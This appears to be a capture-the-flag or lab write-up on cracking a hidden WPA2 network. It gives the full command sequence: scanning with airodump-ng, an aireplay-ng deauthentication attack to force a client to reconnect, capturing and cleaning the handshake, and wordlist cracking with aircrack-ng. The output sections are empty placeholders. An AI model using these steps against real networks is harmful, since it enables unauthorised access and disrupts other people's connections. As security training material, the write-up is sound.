# WPA2 Cracking Challenge Writeup

## Challenge Overview

In this challenge, we are tasked with cracking the WPA2 password of a WLAN network. The network has the following characteristics:

- **Frequency Band**: 2.4GHz ISM band
- **Channel**: Unknown
- **SSID**: Unknown (hidden network)
- **Encryption**: WPA2 Personal
- **Password Source**: Present in the `01GYSUV_2024.csv` file
- **Connected Device**: One device is connected to the network
- **MAC Address**: Unknown
- **Modulation**: Unknown

### Goal

1. Identify the WLAN name (SSID).
2. Find the MAC address of the connected device.
3. Perform a deauthentication attack.
4. Capture at least one complete authentication exchange (handshake).
5. Crack the WPA2 password using a brute-force attack.

## Theoretical Steps

To solve this challenge, we need to follow these high-level steps:

1. **Discover the WLAN**: Identify the SSID, channel, and MAC address of the access point (AP), even if the SSID is hidden.
2. **Identify the Connected Device**: Find the MAC address of the connected client.
3. **Deauthentication Attack**: Force the client to disconnect and reconnect to capture the handshake.
4. **Capture the Handshake**: Use a packet capture tool to intercept the WPA2 handshake.
5. **Crack the Password**: Use the provided wordlist (`01GYSUV_2024.csv`) to brute-force the password.

## Practical Steps

### Step 1: Discover the WLAN (Hidden Network)

To identify a hidden WLAN, we run scans in both managed and monitor modes. This approach provides a more comprehensive overview of the problem and ensures we gather as much data as possible. The outputs of these commands complement each other and allow for a double-check of the results.

1. **Scan in Managed Mode**:
   ```bash
   nmcli dev wifi list ifname wlo1
   ```
   - **Expected Output**: A list of networks, including hidden ones (SSID will be blank).
   - **What to Look For**: Note the channel and BSSID of the hidden network.

   <details closed>
   <summary><b>Output</b></summary>

   ```
   output
   ```

   </details>

2. **Scan in Monitor Mode**:
   ```bash
   sudo airodump-ng wlo1
   ```
   - **Expected Output**: A list of networks with their BSSIDs and channels.
   - **What to Look For**: Match the BSSID and channel of the hidden network from the previous step.

   <details closed>
   <summary><b>Output</b></summary>

   ```
   output
   ```

   </details>

3. **Optional**: To reveal the SSID of the hidden network, use:
   ```bash
   sudo airodump-ng --essid '' wlo1
   ```

   <details closed>
   <summary><b>Output</b></summary>

   ```
   output
   ```

   </details>

### Step 2: Capture Packets for the Hidden Network

Once the BSSID and channel are identified, capture packets for the hidden network:

```bash
sudo airodump-ng -w output_file.pcap -c <channel> --bssid <BSSID> wlo1
```

- **Expected Output**: A `.pcap` file containing packets from the hidden network.
- **What to Look For**: Ensure the capture includes EAPOL packets for handshake analysis.

<details closed>
<summary><b>Output</b></summary>

```
output
```

</details>

### Step 3: Perform a Deauthentication Attack

While running `airodump-ng` to capture packets, execute a deauthentication attack to force the client to disconnect and reconnect. This will trigger the WPA2 handshake, which can then be captured.

```bash
sudo aireplay-ng --deauth 10 -a <BSSID> -c <Client_MAC> wlo1
```

- **Expected Behavior**: The client will be disconnected from the network and will attempt to reconnect, triggering the WPA2 handshake.
- **What to Look For**: Ensure the deauthentication packets are sent successfully.

<details closed>
<summary><b>Output</b></summary>

```
output
```

</details>

### Step 4: Capture and Process the Handshake

Once the `.pcap` file is captured, it needs to be filtered and cleaned to ensure it contains only the relevant handshake packets. This step is crucial for successful handshake verification and password cracking.

#### 4.1 Filter the Capture

Use `tshark` to extract only the relevant packets (EAPOL frames) from the raw `.pcap` file:

```bash
tshark -r file.pcap -Y "eapol" -w filtered_capture.pcap
```

- **Purpose**:
  - The goal of filtering is to isolate EAPOL (Extensible Authentication Protocol over LAN) packets, which are part of the WPA2 handshake process.
  - By reducing the size of the capture file, we focus only on the data necessary for handshake verification and cracking.

- **Peculiarities**:
  - The filter `"eapol"` matches packets containing EAPOL frames.
  - This step excludes irrelevant packets (e.g., beacon frames, data frames), making subsequent processing faster and more efficient.

- **Advanced Filters**:
  - A more specific filter can target only handshake-related packets:
    ```bash
    wlan.fc.type_subtype == 0x08 && eapol
    ```
  - To create a concatenated filter, combine multiple conditions using logical operators (`&&`, `||`, `!`):
    ```bash
    (wlan.fc.type_subtype == 0x08 && wlan.bssid == <BSSID>) || eapol
    ```

#### How to Insert More Complex Filters in Tshark

When using the `tshark` command, you can insert more complex filters by combining multiple conditions with logical operators. However, simply putting everything inside double quotes (`""`) may not work if the syntax is incorrect. Here’s how you can construct and use complex filters:

**Example Command**
```bash
tshark -r file.pcap -Y "(wlan.fc.type_subtype == 0x08 && wlan.bssid == <BSSID>) || (eapol && wlan.sa == <CLIENT_MAC>)" -w filtered_capture.pcap
```

1. **Parentheses `()`**:
   - Use parentheses to group conditions logically.
   - This ensures the correct precedence of logical operations.

2. **Logical Operators**:
   - `&&`: Logical AND (both conditions must be true).
   - `||`: Logical OR (at least one condition must be true).
   - `!`: Logical NOT (negates a condition).

3. **Quoting**:
   - Enclose the entire filter in double quotes (`""`) to ensure it is treated as a single argument by the shell.

#### 4.2 Clean the Capture

After filtering, clean the `.pcap` file using `wpaclean` to prepare it for handshake verification:

```bash
wpaclean cleaned_handshake.pcap filtered_capture.pcap
```

- **Purpose**:
  - Cleaning removes unnecessary packets and ensures the handshake data is in a format suitable for tools like `aircrack-ng`.
  - This step eliminates duplicate packets, irrelevant frames, and noise that might interfere with handshake verification.

- **How It's Cleaned**:
  - `wpaclean` processes the filtered `.pcap` file and extracts only the essential handshake packets. It removes:
    - Duplicate EAPOL packets.
    - Packets unrelated to the handshake process.
    - Corrupted or incomplete frames.

- **Why Cleaning is Necessary**:
  - A raw `.pcap` file often contains redundant or irrelevant data that can confuse handshake verification tools.
  - Cleaning ensures the handshake is valid and complete, which is critical for successful password cracking.

- **Peculiarities**:
  - If the handshake is incomplete or corrupted, `wpaclean` may fail to produce a valid output. In such cases, revisit the capture process to ensure all handshake packets are collected.

### Step 5: Verify and Crack the Handshake

1. **Verify the Handshake**:
   ```bash
   aircrack-ng -a2 -b <BSSID> cleaned_handshake.pcap
   ```

   <details closed>
   <summary><b>Output</b></summary>
    
   ```
   output
   ```
    
   </details>

2. **Crack the Password**:
   ```bash
   aircrack-ng -w 01GYSUV_2024.csv -b <BSSID> cleaned_handshake.pcap
   ```

   <details closed>
   <summary><b>Output</b></summary>
    
   ```
   output
   ```
    
   </details>

## Notes

- **Scripts**: The process can be automated using the provided scripts:
  - Use `wifi-toolkit.sh` for scanning and deauthentication.
  - Use `wpa2-crack.sh` for filtering, cleaning, and cracking the handshake.
- **Environment**: This process was tested on Ubuntu Linux with the `aircrack-ng` suite installed.

## Conclusion

By following the steps outlined above, we successfully identified the hidden WLAN, captured the WPA2 handshake, and cracked the password using a brute-force attack. This challenge demonstrates the importance of using strong passwords and securing wireless networks against deauthentication attacks.
